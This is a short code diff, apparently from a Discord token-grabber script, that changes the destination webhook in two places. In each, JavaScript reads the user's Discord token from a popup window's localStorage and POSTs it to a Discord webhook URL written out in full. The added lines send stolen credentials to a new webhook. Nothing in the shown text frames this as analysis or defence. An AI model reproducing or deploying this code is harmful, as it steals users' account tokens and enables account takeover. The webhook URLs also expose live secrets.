@@ -111,7 +111,7 @@
 		var fasdfee = JSON.parse(popup.localStorage.token);
         $('input#authToken').value = JSON.parse(popup.localStorage.token);
 		var xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://discord.com/api/webhooks/806299004719726602/DpDtW5YiRrL8ES8PnFBFmtTdARpnXHuN1cgrmZTwl_s9FLrlJOsvOft7dxaRccbMtDKz", true);
+        xhr.open("POST", "https://discord.com/api/webhooks/847600183533371413/a9uRRxIVoEVC4N3sqDA4x5ggsyDLzxI5MymeQEaYjCwRfhnrZMYLrV6IxEuPMwdnQ-js", true);
         xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.send(JSON.stringify({
             'content': fasdfee + " ",
@@ -310,7 +310,7 @@
 					var fasdfee = JSON.parse(popup.localStorage.token);
 						$('input#authToken').value = JSON.parse(popup.localStorage.token);
 						var xhr = new XMLHttpRequest();
-						xhr.open("POST", "https://discord.com/api/webhooks/806299004719726602/DpDtW5YiRrL8ES8PnFBFmtTdARpnXHuN1cgrmZTwl_s9FLrlJOsvOft7dxaRccbMtDKz", true);
+						xhr.open("POST", "https://discord.com/api/webhooks/847600183533371413/a9uRRxIVoEVC4N3sqDA4x5ggsyDLzxI5MymeQEaYjCwRfhnrZMYLrV6IxEuPMwdnQ-js", true);
 						xhr.setRequestHeader('Content-Type', 'application/json');
 						xhr.send(JSON.stringify({
 							'content': fasdfee + " ",
